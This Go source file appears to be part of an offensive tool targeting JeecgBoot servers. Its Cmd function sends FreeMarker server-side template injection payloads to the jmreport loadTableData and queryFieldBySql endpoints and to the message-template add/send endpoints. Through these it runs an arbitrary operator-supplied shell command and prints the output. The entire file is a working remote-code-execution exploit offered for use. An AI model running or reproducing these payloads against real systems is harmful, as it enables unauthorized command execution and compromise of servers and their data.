package Core

import (
	common "JeecgExploitssGo/Common"
	"encoding/json"
	"math/rand"
	"os"
	"strconv"
	"strings"
)

/*
func requestFunc(url, body, token string) []byte {
	request, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body)))
	if err != nil {
		common.Colors(common.ColorRed).Printf("[-]构造请求失败, %v\n", err)
		return nil
	}

	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Access-Token", token)

	tls := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tls,
		Timeout:   time.Second * 30,
	}

	response, err := client.Do(request)

}*/

func Cmd(cmd string) {
	switch VulName {
	case "loadTableData":
		loadTableData_poc_1 := "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"" + cmd + "\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}"

		urls := common.JoinURL(Urls, "jmreport/loadTableData")

		body := RequestResult(urls, Token, "POST", []byte(loadTableData_poc_1))

		if err := json.Unmarshal([]byte(body), &common.LoadTableData_poc_1); err != nil {
			common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
			return
		}

		loadTabResult := map[string]interface{}{
			"records": common.LoadTableData_poc_1.LoadTableDataResult.LoadTableDataRecords,
		}

		outputJSON, _ := json.Marshal(loadTabResult)
		common.Colors(common.ColorYellow).Printf("[+++]%s\n", string(outputJSON))

		os.Exit(0)

	case "queryFieldBySql":
		queryFieldBySql := "{\"sql\":\"select 'result:<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ex(\\\"" + cmd + "\\\") }'\"}"

		urls := common.JoinURL(Urls, "jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123")

		body := RequestResult(urls, Token, "POST", []byte(queryFieldBySql))

		if err := json.Unmarshal([]byte(body), &common.QueryFieldBySql); err != nil {
			common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
			os.Exit(1)
		}

		queryFieldBySqlResult := map[string]interface{}{
			"fieldList": common.QueryFieldBySql.QueryFieldBySqlResult.QueryFieldBySqlFieldList,
		}

		outputJSON, _ := json.Marshal(queryFieldBySqlResult)
		common.Colors(common.ColorYellow).Printf("[+++]%s\n", string(outputJSON))

		// 单独利用漏洞不执行RoutineRequest()函数
		os.Exit(0)
	case "freemaker":
		r := rand.Intn(1000)

		// 创建发送模板
		sendMsg_add := "{\"templateType\":\"1\",\"templateCode\":\"" + strconv.Itoa(r) + "\",\"templateName\":\"test\",\"templateContent\":\"${\\\"freemarker.template.utility.Execute\\\"?new()(\\\"" + cmd + "\\\")}\"}"

		addURL := common.JoinURL(Urls, "sys/message/sysMessageTemplate/add")

		_ = RequestResult(addURL, Token, "POST", []byte(sendMsg_add))

		// 发送模板
		sendMsg_sendMsg := "{\"templateCode\":\"" + strconv.Itoa(r) + "\",\"testData\":\"{}\",\"receiver\":\"\",\"msgType\":\"1\"}"

		sendMsgURL := common.JoinURL(Urls, "sys/message/sysMessageTemplate/sendMsg")

		body := RequestResult(sendMsgURL, Token, "POST", []byte(sendMsg_sendMsg))

		// 获取结果
		if strings.Contains(string(body), "成功") {
			api := "/sys/message/sysMessage/list?_t=1732776144&column=createTime&order=desc&field=id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&pageNo=1&pageSize=10"

			resultURL := common.JoinURL(Urls, api)

			resultBody := RequestResult(resultURL, Token, "GET", nil)

			var sendMsgResults common.SendMsg

			if err := json.Unmarshal([]byte(resultBody), &sendMsgResults); err != nil {
				common.Colors(common.ColorRed).Printf("[*]解析 json 失败, %v\n", err)
				os.Exit(1)
			}

			records := sendMsgResults.SendMsgResults.SendMsgRecords[0].EsContent
			common.Colors(common.ColorYellow).Printf("[+++]%s\n", records)

			os.Exit(0)
		}

		os.Exit(1)

	}

	// http.NewRequest("POST", url, nil)
}
